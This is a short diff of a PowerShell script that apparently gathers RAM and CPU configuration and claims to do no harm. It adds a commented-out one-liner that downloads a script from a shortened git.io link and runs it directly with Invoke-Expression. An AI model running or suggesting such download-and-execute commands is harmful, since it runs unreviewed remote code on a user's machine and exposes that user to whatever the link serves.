@@ -1,5 +1,7 @@
 # this script does not any harm to your computer.
 
+# "https://git.io/JkkhR"| %{iex ((New-Object System.Net.WebClient).DownloadString($_))}
+
 $RemoteBlock = {
 
 function Get-RamCPUconfig
